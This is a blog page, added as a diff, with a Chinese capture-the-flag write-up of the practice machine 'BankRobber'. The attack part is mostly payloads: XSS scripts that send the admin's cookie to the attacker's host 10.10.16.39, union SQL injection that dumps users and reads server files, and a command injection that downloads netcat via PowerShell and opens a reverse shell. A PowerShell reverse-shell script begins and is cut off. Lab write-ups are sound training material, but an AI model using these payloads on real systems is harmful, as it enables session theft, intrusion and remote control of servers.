@@ -1,0 +1,793 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0xptS3">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="BankRobber主机发现12345610.10.10.154sudo masscan -p1-65535 10.10.10.154 --rate&#x3D;1000 -e tun0 &gt; portsports&#x3D;$(cat ports | awk -F &quot; &quot; &#x27;&#123;print $4&#125;&#x27; | awk -F &quot;&#x2F;&quot; &amp;#x27">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BankRobber">
+<meta property="og:url" content="http://example.com/2025/02/08/BankRobber/index.html">
+<meta property="og:site_name" content="0xptS3">
+<meta property="og:description" content="BankRobber主机发现12345610.10.10.154sudo masscan -p1-65535 10.10.10.154 --rate&#x3D;1000 -e tun0 &gt; portsports&#x3D;$(cat ports | awk -F &quot; &quot; &#x27;&#123;print $4&#125;&#x27; | awk -F &quot;&#x2F;&quot; &amp;#x27">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/image-20250207182645376.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207191620847.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207191544553.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207191550300.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207191646309.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207191703315.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207192536838.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207192547968.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207195122405.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207195219002.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207200622807.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207200626745.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207200632601.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250207200817257.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208002807070.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208001712469.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208002250625.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208002334166.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208140409931.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208140417058.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208140439074.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208140706197.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208141102460.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208141330571.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208141316464.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208142927525.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208142949987.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208143012948.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208143419331.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208151150588.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208165711994.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208165820341.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208165904094.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208173412720.png">
+<meta property="og:image" content="http://example.com/imgs/image-20250208173401804.png">
+<meta property="article:published_time" content="2025-02-08T10:27:38.000Z">
+<meta property="article:modified_time" content="2025-02-08T10:32:28.299Z">
+<meta property="article:author" content="0xptS3">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/imgs/image-20250207182645376.png">
+  
+  
+  
+  <title>BankRobber - 0xptS3</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0xptS3&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BankRobber"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-08 18:27" pubdate>
+          2025年2月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BankRobber</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="BankRobber"><a href="#BankRobber" class="headerlink" title="BankRobber"></a>BankRobber</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">154</span><br><span class="hljs-attribute">sudo</span> masscan -p1-<span class="hljs-number">65535</span> <span class="hljs-number">10.10.10.154</span> --rate=<span class="hljs-number">1000</span> -e tun0 &gt; ports<br><span class="hljs-attribute">ports</span>=$(cat ports | awk -F <span class="hljs-string">&quot; &quot;</span> &#x27;&#123;print $<span class="hljs-number">4</span>&#125;&#x27; | awk -F <span class="hljs-string">&quot;/&quot;</span> &#x27;&#123;print $<span class="hljs-number">1</span>&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)<br><span class="hljs-attribute">nmap</span> -Pn -sV -sC -p$ports <span class="hljs-number">10.10.10.154</span><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.10.154</span> --script=vuln<br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.10.154</span> -sU --top-ports <span class="hljs-number">20</span> -Pn<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250207182645376.png" srcset="/img/loading.gif" lazyload alt="image-20250207182645376"></p>
+<h3 id="web服务探索"><a href="#web服务探索" class="headerlink" title="web服务探索"></a>web服务探索</h3><p>有登录注册功能</p>
+<p><img src="/../imgs/image-20250207191620847.png" srcset="/img/loading.gif" lazyload alt="image-20250207191620847"></p>
+<p>我们注册一个进去</p>
+<p><img src="/../imgs/image-20250207191544553.png" srcset="/img/loading.gif" lazyload alt="image-20250207191544553"></p>
+<p>xss</p>
+<p><img src="/../imgs/image-20250207191550300.png" srcset="/img/loading.gif" lazyload alt="image-20250207191550300"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://10.10.16.39:3000/hook.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250207191646309.png" srcset="/img/loading.gif" lazyload alt="image-20250207191646309"></p>
+<p>借助beefxss获取cookie</p>
+<p><img src="/../imgs/image-20250207191703315.png" srcset="/img/loading.gif" lazyload alt="image-20250207191703315"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=YWRtaW4%3D; <span class="hljs-attribute">password</span>=SG9wZWxlc3Nyb21hbnRpYw%3D%3D; <span class="hljs-attribute">id</span>=1; <span class="hljs-attribute">BEEFHOOK</span>=hSriBU2AvmCvbBSAhfqKKUGPPULhH0KXbJqySgRwgp0GE7PGyZPPPLq8txtDHo1TfAtNGVXbCcNytgfx<br></code></pre></td></tr></table></figure>
+
+<p>或者写一个js让admin访问</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>request.open(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.39/?test=&#x27;</span>+<span class="hljs-built_in">document</span>.cookie, <span class="hljs-keyword">true</span>);<br>request.send()<br></code></pre></td></tr></table></figure>
+
+<p>存入js文件，然后开启服务器,payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://10.10.16.39/cookie.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>我们拿着获取的cookie解码</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">YWRtaW4</span><span class="hljs-operator">=</span> -&gt; admin<br><span class="hljs-attribute">SG9wZWxlc3Nyb21hbnRpYw</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span> -&gt; Hopelessromantic<br></code></pre></td></tr></table></figure>
+
+<p>登录</p>
+<p><img src="/../imgs/image-20250207192536838.png" srcset="/img/loading.gif" lazyload alt="image-20250207192536838"></p>
+<p><img src="/../imgs/image-20250207192547968.png" srcset="/img/loading.gif" lazyload alt="image-20250207192547968"></p>
+<p>sql注入</p>
+<p><img src="/../imgs/image-20250207195122405.png" srcset="/img/loading.gif" lazyload alt="image-20250207195122405"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">term</span>=<span class="hljs-number">1</span>&#x27;+order+by <span class="hljs-number">3</span>#<br><br><span class="hljs-attribute">term</span>=<span class="hljs-number">1</span>&#x27;+union+select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250207195219002.png" srcset="/img/loading.gif" lazyload alt="image-20250207195219002"></p>
+<p>2有回显</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">term</span>=1&#x27;+union+select 1,database(),3#<br><span class="hljs-comment">#bankrobber</span><br><br><span class="hljs-attribute">term</span>=1&#x27;+union+select 1,group_concat(table_name),3 <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()#<br>balance hold<span class="hljs-built_in"> users</span><br><span class="hljs-built_in"></span><br><span class="hljs-attribute">term</span>=1&#x27;+union+select 1,group_concat(column_name),3 <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=database() <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&quot;users&quot;</span>#<br>id,username,password<br><br><span class="hljs-attribute">term</span>=1&#x27;+union+select 1,group_concat(id,<span class="hljs-string">&quot;,&quot;</span>,username,<span class="hljs-string">&quot; &quot;</span>,password),3 <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>
+
+<p>也许我们需要去写shell</p>
+<p><img src="/../imgs/image-20250207200622807.png" srcset="/img/loading.gif" lazyload alt="image-20250207200622807"></p>
+<p><img src="/../imgs/image-20250207200626745.png" srcset="/img/loading.gif" lazyload alt="image-20250207200626745"></p>
+<p><img src="/../imgs/image-20250207200632601.png" srcset="/img/loading.gif" lazyload alt="image-20250207200632601"></p>
+<p>我们尝试读文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">term</span>=<span class="hljs-number">1</span>&#x27;+union+select <span class="hljs-number">1</span>,LOAD_FILE(&#x27;C:/xampp/htdocs/index.php&#x27;),<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250207200817257.png" srcset="/img/loading.gif" lazyload alt="image-20250207200817257"></p>
+<p>读命令执行的php</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">term</span>=<span class="hljs-number">1</span>&#x27;+union+select <span class="hljs-number">1</span>,LOAD_FILE(&#x27;C:/xampp/htdocs/admin/backdoorchecker.php&#x27;),<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;../link.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;auth.php&#x27;</span>);<br><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>]));<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>]));<br><span class="hljs-variable">$bad</span> 	  = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;$(&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>);<br><span class="hljs-variable">$good</span> 	  = <span class="hljs-string">&quot;ls&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">substr</span>(PHP_OS,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)) == <span class="hljs-string">&quot;win&quot;</span>)&#123;<br>	<span class="hljs-variable">$good</span> = <span class="hljs-string">&quot;dir&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-string">&quot;Hopelessromantic&quot;</span>)&#123;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>			<span class="hljs-comment">// FILTER ESCAPE CHARS</span><br>			<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$bad</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>)&#123;<br>				<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-variable">$char</span>) !== <span class="hljs-literal">false</span>)&#123;<br>					<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You&#x27;re not allowed to do that.&quot;</span>);<br>				&#125;<br>			&#125;<br>			<span class="hljs-comment">// CHECK IF THE FIRST 2 CHARS ARE LS</span><br>			<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>], <span class="hljs-number">0</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$good</span>)) != <span class="hljs-variable">$good</span>)&#123;<br>				<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;It&#x27;s only allowed to use the <span class="hljs-subst">$good</span> command&quot;</span>);<br>			&#125;<br>			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&quot;::1&quot;</span>)&#123;<br>				<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>			&#125; <span class="hljs-keyword">else</span>&#123;<br>				<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;It&#x27;s only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server.&quot;</span>;<br>			&#125;<br>	&#125;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not allowed to use this function!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>REMOTE_ADDR不可以伪造，</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>我们利用xss让admin去读</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br><span class="hljs-keyword">var</span> param = <span class="hljs-string">&#x27;cmd=dir&#x27;</span>;<br>request.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://localhost/admin/backdoorchecker.php&#x27;</span>, <span class="hljs-literal">true</span>);<br>request.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>);<br>request.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (request.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span> &amp;&amp; request.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>        <span class="hljs-keyword">var</span> responseText = request.<span class="hljs-property">responseText</span>;<br>        <span class="hljs-keyword">var</span> remoteRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        remoteRequest.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.39:9001&#x27;</span>, <span class="hljs-literal">true</span>);<br>        remoteRequest.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>);<br>        remoteRequest.<span class="hljs-title function_">send</span>(responseText);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">var</span> param1 = <span class="hljs-string">&#x27;fuck&#x27;</span>;<br>        <span class="hljs-keyword">var</span> remoteRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        remoteRequest.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://10.10.16.39:9001&#x27;</span>, <span class="hljs-literal">true</span>);<br>        remoteRequest.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/plain&#x27;</span>);<br>        remoteRequest.<span class="hljs-title function_">send</span>(param1);<br>    &#125;<br>    &#125;;<br>request.<span class="hljs-title function_">send</span>(param);<br></code></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();<br><span class="hljs-keyword">var</span> <span class="hljs-keyword">params</span> = <span class="hljs-string">&#x27;cmd=dir|powershell -c &quot;iwr -uri 10.10.16.39/nc64.exe -outfile %temp%\\n.exe&quot;; %temp%\\n.exe -e cmd.exe 10.10.16.39 9001&#x27;</span>;<br>request.open(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;http://localhost/admin/backdoorchecker.php&#x27;</span>, <span class="hljs-literal">true</span>);<br>request.setRequestHeader(<span class="hljs-string">&#x27;Content-type&#x27;</span>, <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>);<br>request.send(<span class="hljs-keyword">params</span>);<br></code></pre></td></tr></table></figure>
+
+<p>发送如下payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://10.10.16.39/shell.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208002807070.png" srcset="/img/loading.gif" lazyload alt="image-20250208002807070"></p>
+<h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><p>查看js文件</p>
+<p><img src="/../imgs/image-20250208001712469.png" srcset="/img/loading.gif" lazyload alt="image-20250208001712469"></p>
+<p>我们可以直接调用</p>
+<p>反弹shell ps1脚本如下</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$socket</span> = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient(<span 